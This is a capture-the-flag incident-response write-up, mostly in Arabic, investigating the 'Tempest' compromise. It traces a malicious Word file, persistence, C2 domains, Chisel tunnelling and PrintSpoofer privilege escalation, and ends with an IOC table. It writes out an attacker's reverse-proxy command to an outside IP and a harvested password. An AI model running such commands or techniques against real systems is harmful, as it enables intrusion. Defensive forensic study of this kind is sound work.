#### 37. Tempest (Investigation Challenge)
<p align="center">
  <img src="../images/tempest_badge.png" width="45%" />
  <img src="../images/tempest_tasks.png" width="45%" />
</p>

---

# 🕵️‍♂️ Investigation Report: Case Tempest (The Perfect Storm)

## 📋 Scenario Overview
بصفتي محلل استجابة للحوادث (**Incident Responder**)، تم تكليفي بالتحقيق في اختراق عالي الخطورة (**CRITICAL**) لجهاز "Tempest". الاختراق بدأ بملف Word خبيث تم تحميله عبر المتصفح، وتطور إلى تنفيذ أوامر عن بُعد، تصعيد صلاحيات، وإنشاء آليات بقاء داخل النظام.

---

## 🛠️ Investigation Strategy & Toolset
تم الاعتماد على نهج الـ **Artifact-Centric Analysis** لربط سجلات المضيف بحركة الشبكة:

* **Endpoint Analysis:** استخدام **EvtxEcmd** لتحويل السجلات، و **Timeline Explorer** لتحليل الجدول الزمني، و **SysmonView** لرسم علاقات العمليات.
* **Network Analysis:** استخدام **Wireshark** للتحليل الدقيق و **Brim** لمعالجة كميات الـ Traffic الكبيرة بسرعة باستخدام لغة **ZQL**.
* **Integrity Check:** التحقق من سلامة الأدلة عبر SHA256 (مثال: `capture.pcapng` بـ Hash يبدأ بـ `CB3A...`).

---

## 🔍 Technical Findings (Attack Lifecycle)

### 1. Initial Access & Execution (Stage 1)
* **The Hook:** تم تحميل ملف خبيث باسم `free_magicules.doc` بواسطة المستخدم `benimaru` على جهاز `TEMPEST`.
* **The Lever:** عملية `WinWord.exe` (PID: 496) هي من قامت بفتح الملف وتفعيل السلسلة الخبيثة.
* **The Payload:** تم تنفيذ كود **Base64** مشفر داخل الـ Document أدى إلى تحميل المرحلة الثانية.

### 2. Persistence & C2 Communication (Stage 2)
* **Persistence:** المهاجم زرع ملفاً في مسار الـ **Startup** لضمان التنفيذ التلقائي:
    `C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
* **Stage 2 C2:** التواصل تم مع النطاق `resolvecyber.xyz` عبر المنفذ `80`.
* **Binary Download:** تم رصد تحميل ملف ثنائي خبيث بـ Hash: `CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8`.

### 3. Internal Reconnaissance & Reverse Proxy
* **The Tool:** استخدم المهاجم أداة **Chisel** (`ch.exe`) لإنشاء **Reverse Socks Proxy** للوصول للخدمات الداخلية.
* **Command:** `ch.exe client 167.71.199.191:8080 R:socks`.
* **Credential Harvesting:** تم اكتشاف كلمة مرور `infernotempest` داخل ملف حساس على الجهاز.

### 4. Privilege Escalation (Fully Owned)
* **Exploit:** استخدم المهاجم أداة **PrintSpoofer** (`spf.exe`) لاستغلال صلاحية `SeImpersonatePrivilege`.
* **System Access:** بعد الحصول على صلاحيات **SYSTEM**، قام المهاجم بإنشاء حسابات مستخدمين جدد (`shion`, `shuna`) وإضافتهم لمجموعة الـ **Administrators**.
* **Final Persistence:** تم إنشاء خدمة نظام باسم `TempestUpdate2` لتشغيل ملف `final.exe` بشكل دائم بصلاحيات SYSTEM.

---

## 📊 Attack Timeline (Summary)
1.  **Phishing:** تحميل وتشغيل `free_magicules.doc`.
2.  **C2 Est:** اتصال بـ `phishteam.xyz` لسحب المرحلة الثانية.
3.  **Persistence:** زرع Payload في الـ Startup.
4.  **Recon:** استخدام Chisel و WinRM للتنقل الجانبي.
5.  **PrivEsc:** استغلال PrintSpoofer للوصول لصلاحيات SYSTEM.
6.  **Full Control:** إنشاء مستخدمين جدد وخدمة نظام دائمة.

---

## 🛡️ Indicators of Compromise (IOCs)
| Type | Value |
| :--- | :--- |
| **Domain** | `resolvecyber.xyz`, `phishteam.xyz` |
| **IP** | `167.71.199.191` |
| **File Hash** | `CE278CA242AA2023A4FE0406...` |
| **Tools** | Chisel, PrintSpoofer, Powershell (Encoded) |
